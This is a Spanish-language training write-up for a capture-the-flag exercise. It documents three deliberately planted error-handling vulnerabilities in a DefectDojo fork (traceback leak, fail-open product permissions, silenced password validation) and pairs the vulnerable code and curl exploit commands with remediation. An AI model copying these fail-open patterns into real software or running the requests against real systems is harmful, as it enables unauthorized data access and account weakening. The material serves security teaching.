# OWASP A10:2025 — Mishandling of Exceptional Conditions
## Vulnerabilidades de práctica implementadas en DefectDojo

> **Propósito:** Material de entrenamiento para ejercicio de *capture-the-flag* / análisis de código. Las vulnerabilidades fueron introducidas **intencionalmente** en el fork de DefectDojo.
> **No ejecutar en producción ni contra sistemas sin autorización.**

---

## Índice

1. [Vuln 1 — Traceback completo en respuesta de error (CWE-209)](#vuln-1--traceback-completo-en-respuesta-de-error-cwe-209)
2. [Vuln 2 — Failing open en verificación de permisos (CWE-636)](#vuln-2--failing-open-en-verificaci%C3%B3n-de-permisos-cwe-636)
3. [Vuln 3 — Validación de contraseña detectada pero silenciada (CWE-390)](#vuln-3--validaci%C3%B3n-de-contrase%C3%B1a-detectada-pero-silenciada-cwe-390)

---

## Vuln 1 — Traceback completo en respuesta de error (CWE-209)

### Descripción

CWE-209 ocurre cuando un mensaje de error expone información interna del sistema al cliente: rutas del sistema de archivos, nombres de módulos y paquetes instalados, versiones de frameworks, nombres de tablas de base de datos, o rastros de pila completos (*stack traces*). Esta información es oro para un atacante en la fase de reconocimiento: le permite conocer la arquitectura interna antes de intentar un ataque más sofisticado.

En este caso, el exception handler global de la API (`custom_exception_handler` en `dojo/api_v2/exception_handler.py`) incluye `traceback.format_exc()` en el campo `detail` de cualquier respuesta HTTP 500. Cualquier endpoint que cause un error interno no manejado — con un simple valor inválido en la URL — expone rutas absolutas, nombres de módulos y números de línea exactos.

### Ubicación en el código

| Elemento | Detalle |
|----------|---------|
| **Archivo (handler)** | `dojo/api_v2/exception_handler.py` |
| **Función** | `custom_exception_handler` |
| **Archivo (trigger)** | `dojo/api_v2/views.py` — `FindingViewSet.get_queryset` |
| **Endpoint** | `GET /api/v2/findings/?filter_extra=<campo_invalido>` |

### Código vulnerable

```python
def custom_exception_handler(exc, context):
    response = exception_handler(exc, context)
    ...
    elif response is None:
        exception_message = str(exc.args[0]) if exc.args else str(exc)
        logger.error(exc, exc_info=True)
        response = Response()
        response.status_code = HTTP_500_INTERNAL_SERVER_ERROR
        response.data = {}
        response.data["message"] = exception_message
        response.data["detail"] = traceback.format_exc()   # ← traceback completo en la respuesta
        ErrorPageProductAnnouncement(response=response)
```

### Cómo explotar

**Requisito:** token de API de cualquier usuario autenticado.

El helper `deployment/helpers/A10/A10_V1.py` automatiza el flujo:

```bash
python deployment/helpers/A10/A10_V1.py --host http://<HOST> --token <TOKEN>
```

**Manual con `curl` — cualquier endpoint con un valor inválido:**

```bash
TOKEN=<API_TOKEN>
HOST=http://<HOST>

# filter_extra pasa el valor directamente al ORM sin validar.
# Un campo inexistente lanza FieldError → excepción no manejada → 500 con traceback
curl -s -H "Authorization: Token $TOKEN" \
  "$HOST/api/v2/findings/?filter_extra=INVALID_FIELD" | python3 -m json.tool
```

**Salida esperada:**

```json
{
  "message": "...",
  "detail": "Traceback (most recent call last):\n  File \"/app/dojo/api_v2/views.py\", line ...\n  ...\nValueError: Field 'id' expected a number but got 'TRIGGER_ERROR'.\n"
}
```

La respuesta revela:

- Ruta absoluta del servidor: `/app/dojo/api_v2/views.py`
- Número exacto de línea del código
- Versión de Python y Django (implícita en el formato del traceback)

### Escenario de ataque real

Un atacante usa la información del traceback para:

1. **Reconocimiento**: conocer la estructura exacta del proyecto (`/app/dojo/api_v2/...`).
2. **Path traversal**: la ruta absoluta confirma dónde buscar archivos sensibles.
3. **Versioning**: el traceback indica qué versión de Django/DRF está instalada, permitiendo buscar CVEs específicos.
4. **Encadenamiento**: combinar con A08-Vuln1 (deserialización pickle) — el traceback revela el módulo exacto donde está el endpoint vulnerable.

### Impacto

- Exposición de la arquitectura interna del servidor (rutas, módulos, versiones).
- Facilita la planificación de ataques más precisos (injection, path traversal, RCE).
- Viola el principio de *least disclosure*: el cliente no necesita saber cómo está construido el servidor.

### Remediación

- Nunca incluir `traceback.format_exc()` en respuestas HTTP.
- Respetar el flag `api_expose_error_details` que ya existía en la lógica original.
- Loguear el traceback internamente y retornar solo un ID de correlación:
  ```python
  logger.exception("Unhandled error [%s]", error_id)
  response.data["message"] = "Internal server error"
  response.data["reference"] = str(error_id)
  ```

---

## Vuln 2 — Failing open en control de acceso a productos (CWE-636)

### Descripción

CWE-636 (*Not Failing Securely — Failing Open*) ocurre cuando un sistema, al encontrar una condición de error en una comprobación de seguridad, permite el acceso en lugar de denegarlo. La lógica correcta ante una excepción en un control de acceso es siempre denegar (*fail closed*); hacer lo contrario convierte cada error en una puerta abierta.

En este caso, `ProductViewSet.get_queryset()` envuelve la lógica de autorización en un `try/except`. El parámetro `sort_field` permite al cliente especificar por qué campo ordenar los resultados: si el campo no existe en el modelo, Django lanza `FieldError` de inmediato. El `except` captura esa excepción y — en lugar de retornar un error — devuelve `Product.objects.all()`, exponiéndole al usuario **todos los productos** del sistema, incluyendo aquellos a los que no tiene acceso.

Adicionalmente, `UserHasProductPermission.has_object_permission` tiene el mismo patrón: valida que el campo `sort_field` exista en el modelo (lanzando `FieldDoesNotExist` si no existe) dentro de un `try/except` que, ante cualquier excepción, retorna `True`.

El resultado: con `?sort_field=<campo_invalido>`, un usuario con acceso a un solo producto puede enumerar y acceder a **cualquier producto** del sistema.

### Ubicación en el código

| Elemento | Detalle |
|----------|---------|
| **Archivo (queryset)** | `dojo/api_v2/views.py` |
| **Función** | `ProductViewSet.get_queryset` |
| **Archivo (permisos)** | `dojo/api_v2/permissions.py` |
| **Clase** | `UserHasProductPermission.has_object_permission` |
| **Endpoint** | `GET /api/v2/products/?sort_field=<campo_invalido>` |

### Código vulnerable

```python
# dojo/api_v2/views.py — ProductViewSet
def get_queryset(self):
    try:
        products = get_authorized_products(Permissions.Product_View)
        sort_field = self.request.query_params.get("sort_field")
        if sort_field:
            products = products.order_by(sort_field)  # ← FieldError para campos inválidos
        return products.distinct()
    except Exception:
        return Product.objects.all().distinct()   # ← fail open: todos los productos

# dojo/api_v2/permissions.py — UserHasProductPermission
def has_object_permission(self, request, view, obj):
    try:
        sort_field = request.query_params.get("sort_field")
        if sort_field:
            obj.__class__._meta.get_field(sort_field)  # ← FieldDoesNotExist para campos inválidos
        return check_object_permission(
            request, obj,
            Permissions.Product_View, Permissions.Product_Edit, Permissions.Product_Delete,
        )
    except Exception:
        return True   # ← fail open: acceso concedido
```

### Cómo explotar

**Requisito:** token de API de cualquier usuario autenticado (incluso con acceso a un solo producto).

```bash
TOKEN=<API_TOKEN>
HOST=http://<HOST>

# 1. Listar productos autorizados normalmente
curl -s -H "Authorization: Token $TOKEN" \
  "$HOST/api/v2/products/?format=json" | python3 -c "import sys,json; d=json.load(sys.stdin); print('Productos autorizados:', d['count'])"

# 2. Bypass con sort_field inválido → todos los productos expuestos
curl -s -H "Authorization: Token $TOKEN" \
  "$HOST/api/v2/products/?format=json&sort_field=INVALID_FIELD" | python3 -c "import sys,json; d=json.load(sys.stdin); print('Productos visibles con bypass:', d['count'])"

# 3. Acceder al detalle de un producto sin autorización
curl -s -H "Authorization: Token $TOKEN" \
  "$HOST/api/v2/products/42/?sort_field=INVALID_FIELD" | python3 -m json.tool
```

**Resultado esperado:**
- Sin `sort_field`: solo los productos propios del usuario
- Con `?sort_field=INVALID_FIELD`: todos los productos del sistema (HTTP 200)
- Con `?sort_field=INVALID_FIELD` en el detalle: acceso al producto sin autorización (HTTP 200)

### Escenario de ataque real

1. Un atacante tiene acceso legítimo a su propio producto (`ctf_producto_a`).
2. Con `GET /api/v2/products/?sort_field=INVALID_FIELD` enumera TODOS los productos del sistema.
3. Descubre un producto sensible (`ctf_producto_secreto`) con su ID.
4. Con `GET /api/v2/products/99/?sort_field=INVALID_FIELD` accede al detalle completo del producto.
5. Puede leer nombre, descripción, miembros, configuraciones y metadatos del producto al que no debería tener acceso.

### Impacto

- Escalado horizontal de privilegios: un usuario con acceso a 1 producto puede leer datos de todos los productos.
- Exposición de la estructura organizativa de la empresa (nombres de productos, teams, contactos).
- Base para ataques encadenados: conocer productos permite atacar sus tests, engagements y findings.
- La vulnerabilidad es silenciosa — no genera ningún error ni log de seguridad.

### Remediación

- **Nunca hacer fail-open en controles de acceso.** Si el ordenamiento falla, retornar error 400:
  ```python
  from django.core.exceptions import FieldError

  def get_queryset(self):
      products = get_authorized_products(Permissions.Product_View)
      sort_field = self.request.query_params.get("sort_field")
      if sort_field:
          try:
              products = products.order_by(sort_field)
          except FieldError:
              raise ValidationError({"sort_field": f"Campo de ordenamiento inválido: '{sort_field}'"})
      return products.distinct()
  ```
- Validar el campo de ordenamiento contra una lista blanca antes de pasarlo al ORM.
- En `has_object_permission`, nunca retornar `True` en el `except` — siempre `return False`.

---

## Vuln 3 — Validación de contraseña detectada pero silenciada (CWE-390)

### Descripción

CWE-390 (*Detection of Error Condition Without Action*) ocurre cuando el código detecta un error pero no hace nada al respecto — lo captura y continúa como si no hubiera ocurrido. Esto es especialmente grave en controles de seguridad: la validación existe en el código, pero nunca se ejecuta efectivamente.

En este caso, `change_password` llama a `validate_password()` de Django (que comprueba longitud mínima, similitud con el username, contraseñas comunes, etc.) dentro de un `try/except Exception: pass`. La excepción `ValidationError` que Django lanza cuando la contraseña es débil es capturada y silenciada — la contraseña se guarda igualmente.

### Ubicación en el código

| Elemento | Detalle |
|----------|---------|
| **Archivo** | `dojo/user/views.py` |
| **Función** | `change_password` |
| **Ruta** | `POST /change-password` |

### Código vulnerable

```python
def change_password(request):
    user = get_object_or_404(Dojo_User, pk=request.user.id)
    ...
    if request.method == "POST":
        draft_value = request.POST.get("new_password")
        if draft_value:
            try:
                validate_password(draft_value, user)
            except Exception:
                pass                        # ← ValidationError ignorada
            user.set_password(draft_value)  # ← contraseña débil guardada de todas formas
            Dojo_User.disable_force_password_reset(user)
            user.save()
```

### Cómo explotar

**Requisito:** sesión activa de cualquier usuario.

```bash
HOST=http://<HOST>

# 1. Obtener CSRF token
CSRF=$(curl -sc /tmp/c.txt "$HOST/change-password" | \
  grep -oP 'csrfmiddlewaretoken.*?value="\K[^"]+' | head -1)

# 2. Cambiar la contraseña a algo trivialmente débil
curl -s -X POST "$HOST/change-password" \
  -b /tmp/c.txt -c /tmp/c.txt \
  -d "new_password=123&csrfmiddlewaretoken=$CSRF" \
  -L -o /dev/null -w "HTTP %{http_code}\n"
# Salida esperada: HTTP 200 (redirect a view_profile)

# 3. Confirmar que el login con la contraseña débil funciona
curl -s -X POST "$HOST/login" \
  -c /tmp/c2.txt -b /tmp/c2.txt \
  -d "username=<USER>&password=123&csrfmiddlewaretoken=$(
    curl -sc /tmp/c2.txt "$HOST/login" | grep -oP 'csrfmiddlewaretoken.*?value="\K[^"]+' | head -1
  )" -L -o /dev/null -w "HTTP %{http_code}\n"
# Salida esperada: HTTP 200 (login exitoso con contraseña "123")
```

### Escenario de ataque real

1. Un usuario interno (o un atacante que comprometió una cuenta) usa la vista `/change-password` para establecer una contraseña de un solo carácter.
2. Ahora la cuenta es vulnerable a cualquier ataque de fuerza bruta o diccionario básico.
3. En combinación con la ausencia de rate limiting efectivo (si `RATE_LIMITER_BLOCK` está en `False`), la cuenta puede ser comprometida trivialmente.
4. El sistema reporta que la contraseña fue cambiada con éxito — el usuario ni siquiera sabe que su nueva contraseña es débil.

### Impacto

- Los requisitos de complejidad de contraseña definidos en la configuración de DefectDojo (`minimum_password_length`, `lowercase_character_required`, etc.) son ignorados completamente para este flujo.
- Un atacante con acceso a la sesión puede debilitar intencionalmente la contraseña de la víctima para facilitar un acceso posterior.
- Viola requisitos de cumplimiento (NIST SP 800-63B, PCI-DSS 8.3) que exigen aplicación efectiva de políticas de contraseñas.

### Remediación

- Propagar la excepción de validación en lugar de silenciarla:
  ```python
  try:
      validate_password(draft_value, user)
  except ValidationError as e:
      messages.add_message(request, messages.ERROR,
                           " ".join(e.messages), extra_tags="alert-danger")
      return render(request, "dojo/change_pwd.html", {"form": form})
  user.set_password(draft_value)
  ```
- Nunca usar `except Exception: pass` en controles de seguridad — es siempre un error de diseño.
- Importar `ValidationError` explícitamente para capturar solo el tipo correcto y dejar que otras excepciones (errores inesperados) se propaguen.

---

## Tabla resumen

| # | Nombre | CWE | Archivo afectado | Demostración |
|---|--------|-----|-----------------|-------------|
| 1 | Traceback en error de API | CWE-209 | `exception_handler.py` + `views.py` | `GET /api/v2/findings/?filter_extra=X` → campo `detail` con stack trace completo |
| 2 | Failing open en control de acceso a productos | CWE-636 | `dojo/api_v2/views.py` + `permissions.py` | `GET /api/v2/products/?sort_field=INVALID` → todos los productos expuestos |
| 3 | Validación silenciada | CWE-390 | `dojo/user/views.py` | `POST /change-password` con `new_password=123` → contraseña guardada sin error |

---

## Referencias

- [OWASP Top 10 A10:2025](https://owasp.org/Top10/2025/A10_2025-Mishandling_of_Exceptional_Conditions/)
- [OWASP Cheat Sheet: Error Handling](https://cheatsheetseries.owasp.org/cheatsheets/Error_Handling_Cheat_Sheet.html)
- [OWASP Testing Guide: Testing for Improper Error Handling](https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/08-Testing_for_Error_Handling/01-Testing_For_Improper_Error_Handling)
- [CWE-209: Generation of Error Message Containing Sensitive Information](https://cwe.mitre.org/data/definitions/209.html)
- [CWE-390: Detection of Error Condition Without Action](https://cwe.mitre.org/data/definitions/390.html)
- [CWE-636: Not Failing Securely ('Failing Open')](https://cwe.mitre.org/data/definitions/636.html)
- [NIST SP 800-63B: Digital Identity Guidelines — Memorized Secrets](https://pages.nist.gov/800-63-3/sp800-63b.html)
